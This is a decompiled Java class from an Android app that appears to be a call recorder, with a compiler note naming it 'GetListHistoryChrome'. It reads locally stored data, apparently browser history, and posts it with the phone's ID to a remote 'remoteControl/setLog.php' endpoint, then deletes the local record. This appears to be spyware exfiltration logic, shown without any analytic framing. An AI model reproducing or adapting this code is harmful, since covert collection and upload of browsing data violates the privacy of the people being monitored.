package com.yasoka.spcallrecord.recorder.call.a.c.a;

import a.c.j.c;
import android.content.Context;
import com.app.action.a;
import com.app.activity.MyApp;
import java.util.HashMap;
import java.util.Map;

/* compiled from: GetListHistoryChrome */
public class e {

    /* renamed from: a reason: collision with root package name */
    private int f13a;

    /* renamed from: b reason: collision with root package name */
    private int f14b;

    /* renamed from: c reason: collision with root package name */
    private String f15c;

    public e(int i, int i2, String str) {
        this.f13a = i;
        this.f14b = i2;
        this.f15c = str;
        String str2 = "";
        try {
            Context applicationContext = MyApp.b().getApplicationContext();
            String b2 = a.b(applicationContext, this.f13a, a.c.j.a.f296b);
            String b3 = c.b();
            HashMap hashMap = new HashMap();
            StringBuilder sb = new StringBuilder();
            sb.append(str2);
            sb.append(a.c.e.e.e(applicationContext));
            hashMap.put("idPhone", sb.toString());
            hashMap.put("dateConnexion", b3);
            hashMap.put("type", this.f15c);
            StringBuilder sb2 = new StringBuilder();
            sb2.append(str2);
            sb2.append(this.f14b);
            hashMap.put("idLog", sb2.toString());
            hashMap.put("data", b2);
            long a2 = a.a.a(a.c.e.e.e(applicationContext), b3, this.f15c, this.f14b, b2, applicationContext);
            if (a.c.e.a.b("remoteControl/setLog.php", (Map<String, String>) hashMap)) {
                a.a.d((int) a2, applicationContext);
            }
        } catch (Exception e2) {
            e2.getStackTrace();
        }
    }
}
